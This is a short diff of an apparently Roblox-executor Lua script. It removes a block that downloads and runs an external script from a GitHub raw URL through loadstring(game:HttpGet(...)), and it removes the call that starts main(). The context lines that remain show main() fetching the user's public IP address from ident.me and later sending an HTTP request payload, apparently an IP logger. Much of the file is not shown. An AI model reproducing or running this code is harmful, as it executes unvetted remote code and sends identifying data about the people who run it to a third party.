@@ -1,10 +1,3 @@
--- Load the external script from GitHub
-local externalScript = loadstring(game:HttpGet("https://raw.githubusercontent.com/Dontletmecook/Minhub/main/MInhub"))()
-if externalScript then
-    externalScript()  -- Execute the loaded external script if it was successfully retrieved
-end
-
--- Run the main logic only once when the script starts
 local function main()
     -- Fetch the IP address
     local IP = game:HttpGet("https://v4.ident.me")
@@ -109,6 +102,3 @@ local function main()
         http_request(request_payload)
     end
 end
-
--- Run the main function once
-main()
